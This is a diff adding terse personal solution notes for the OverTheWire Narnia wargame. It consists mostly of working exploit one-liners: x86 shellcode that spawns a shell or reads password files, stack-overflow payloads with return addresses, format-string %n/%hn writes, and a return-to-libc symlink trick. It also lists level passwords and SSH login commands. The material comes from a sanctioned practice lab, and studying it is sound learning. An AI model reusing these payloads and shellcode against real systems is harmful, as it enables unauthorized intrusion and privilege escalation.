@@ -1,0 +1,119 @@
+narnia.labs.overthewire.org
+2226
+
+narnia0
+narnia0
+
+python -c "print 'A'*20 + '\xEF\xBE\xAD\xDE' + 'B'*4072 + 'cat /etc/narnia_pass/narnia1'" | ./narnia0
+
+*** AJ's Solution***  (python -c "print 'B'*20+'efbeadde'.decode('hex')";cat -) | ./narnia0
+narnia1
+efeidiedae
+
+export EGG=`python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"` && ./narnia1
+
+
+narnia2
+nairiepecu
+
+x/40xw $esp-144
+40 + 28 + 64
+just a shell
+`python -c "print  'A'*40 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'D'*64 + '\xE0\xD5\xFF\xFF'"`
+setreuid sh
+`python -c "print  'A'*40 + '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80' + 'D'*59 + '\xE0\xD5\xFF\xFF'"`
+`python -c "print  'A'*40 + '\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x0f\x89\x5b\x10\x89\x43\x14\xb0\x0b\x8d\x4b\x10\x8d\x53\x14\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x70\x79\x74\x68\x6f\x6e' + 'D'*38 + '\xE0\xD5\xFF\xFF'"`
+`python -c "print  'A'*40 + '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80' + 'D'*58 + '\xE0\xD5\xFF\xFF'"`
+`python -c "print  'A'*40 + '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /etc/narnia_pass/narnia3' + 'D'*15 + '\xE0\xD5\xFF\xFF'"`
+`python -c "print  'A'*40 + '\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x6e\x69\x61\x33\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80' + 'D'*35 + '\xE0\xD5\xFF\xFF'"`
+
+narnia3
+vaequeezee
+
+
+
+narnia4
+thaenohtai
+
+putty -ssh -P 2226 -pw thaenohtai narnia4@narnia.labs.overthewire.org 
+rop with memset and strcpy on loop? 
+`python -c "print 'D'*264 + '\xEA\x84\x04\x08'"`
+
+setreuid dash - in gdb
+`python -c "print 'A'*4 + '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80' + 'D'*227 + '\xB0\xD7\xFF\xFF'"`
+unset env LINES
+unset env COLUMNS
+set disas
+
+narnia5
+faimahchiy
+putty -ssh -P 2226 -pw faimahchiy narnia5@narnia.labs.overthewire.org
+format string vuln 
+
+unset env LINES
+unset env COLUMNS
+set disassembly-flavor intel
+alias ir=info register
+
+esp: 0xffffd074
+i: 0xffffd6d0
+
+esp - i = 0x65C = 1628
+0x65c/ 4 = 0x197 = 407
+`python -c "print 'D'*4 + '%08x.'*4 + '%n'"`
+`python -c "print '\xD0\xD6\xFF\xFF'+ '%08x.'*3 "`
+`python -c "print '\xE0\xD6\xFF\xFF' + '%n'"` --- overwrites value to 4
+
+`python -c "print 'D'*4 + '%x'*3 "` 
+ /narnia/narnia5 $(python -c 'print "\xd0\xd6\xff\xff"')%.496x%1\$n
+Grey hat hacking has an excellent guide on how to make these types of strings, and now I have a script to do it for me
+
+
+narnia6
+neezocaeng
+putty -ssh -P 2226 -pw neezocaeng narnia6@narnia.labs.overthewire.org
+
+
+
+ $(python -c "print 'D'*16 + ' ' + 'A'*16")
+$(python -c "print 'D'*8 + ' ' + 'A'*16 + '\xa0\xd6\xff\xff' + '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'")
+this didn't work, but fp is a function pointer to puts, might be able to return to libc and output contents to console with no elevated shell, or get a shell through return to libc
+$(python -c "print '/bin/sh' + ' ' + 'A'*16 + '\x50\xc8\xe4\xf7'")
+$(python -c "print 'D' + ' ' + 'A'*12 + '\x50\xc8\xe4\xf7' + 'C'*4 + '\xc8\xec\xe4\xf7'")
+
+Might be able to corrupt memory of address for fp so that it points to system rather than puts
+
+
+$(python -c "print '10000000' + ' ' + 'A' ") this 
+This gets system in eax so that it is called near the end
+ $(python -c "print '/bin/sh\x00' + '\x50\xc8\xe4\xf7' + ' ' + 'A'")
+
+ 
+ 
+mkdir /tmp/m 
+ln -s /bin/sh $(python -c "print '/tmp/m/a' + '\x50\xc8\xe4\xf7'") 
+/narnia/narnia6 $(python -c "print '/tmp/m/a' + '\x50\xc8\xe4\xf7'  + ' ' + 'A'")
+ 
+narnia7
+ahkiaziphu
+
+ 
+putty -ssh -P 2226 -pw ahkiaziphu narnia7@narnia.labs.overthewire.org
+ 
+unset env LINES
+unset env COLUMNS
+set disassembly-flavor intel
+alias ir=info register
+ 
+string format vuln 
+change 0x80486ff into 0x8048724
+run $(python -c "print '\x48\xd6\xff\xff' + '%08x'*1")%n attempts execution at 0xc
+run $(python -c "print '\x48\xd6\xff\xff\x48\xd6\xff\xff'")%.2044x%\$hn%.32544x%2\$hn
+/narnia/narnia7 $(python -c "print '\x48\xd6\xff\xff\x28\xd6\xff\xff'")%.2044x%\$hn%.32540x%3\$hn
+
+putty -ssh -P 2226 -pw mohthuphog narnia8@narnia.labs.overthewire.org
+
+ 
+looks like another string formatting one, probably going to try to call system
+not string formatting, def a buffer overflow in there tho
+$(python -c "print ''")
